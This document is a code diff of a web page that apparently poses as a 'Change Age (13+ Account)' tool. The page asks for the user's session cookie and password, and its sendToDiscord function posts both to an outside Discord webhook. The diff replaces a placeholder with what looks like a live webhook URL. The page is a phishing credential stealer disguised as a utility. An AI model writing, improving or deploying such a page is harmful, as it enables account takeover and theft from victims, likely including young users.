@@ -1,59 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Change Age</title>
   <style>
     body {
-      background-color: #1e1e2f;
       font-family: Arial, sans-serif;
-      color: #fff;
-      text-align: center;
-      padding-top: 40px;
+      background-color: #111827;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
     }
-    .container {
-      background: #2f3542;
-      padding: 20px;
+    .form {
+      background: #1f2937;
+      padding: 30px;
       border-radius: 15px;
-      display: inline-block;
-      min-width: 300px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    input, button {
+      width: 100%;
+      margin: 10px 0;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
     }
     input {
-      display: block;
-      margin: 10px auto;
-      padding: 10px;
-      width: 80%;
-      border-radius: 5px;
-      border: none;
-      background: #1e272e;
+      background-color: #374151;
       color: white;
     }
     button {
-      background: #ffa502;
-      color: white;
-      border: none;
-      padding: 10px 30px;
-      border-radius: 5px;
+      background-color: #00ffff;
+      color: #000;
+      font-weight: bold;
       cursor: pointer;
-      font-size: 16px;
-      margin-top: 10px;
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="form">
     <h2>Change Age (13+ Account)</h2>
     <p><strong>Note:</strong> Only works on accounts without 2FA.</p>
-    <input type="text" id="cookie" placeholder="Cookie">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="sendToDiscord()">Change</button>
+    <input type="text" id="cookie" placeholder="Enter cookie" />
+    <input type="password" id="password" placeholder="Enter password" />
+    <button onclick="sendToDiscord()">Submit</button>
   </div>
 
   <script>
     async function sendToDiscord() {
-      const cookie = document.getElementById("cookie").value;
-      const password = document.getElementById("password").value;
-      const webhook = "YOUR_WEBHOOK_URL"; // Replace with actual Discord webhook
+      const cookie = document.getElementById("cookie").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const webhook = "https://discord.com/api/webhooks/1359540991710859566/x0Q8WbwtQR2WzgEacXd1DXFoLFJiYGRMGSMFPYw_pW6r_gvSv5UixBi9aTKG3crqPtFT"; // Replace with your actual webhook
 
       if (!cookie || !password) {
         alert("Please enter both cookie and password.");
@@ -73,9 +84,7 @@
       try {
         await fetch(webhook, {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
 
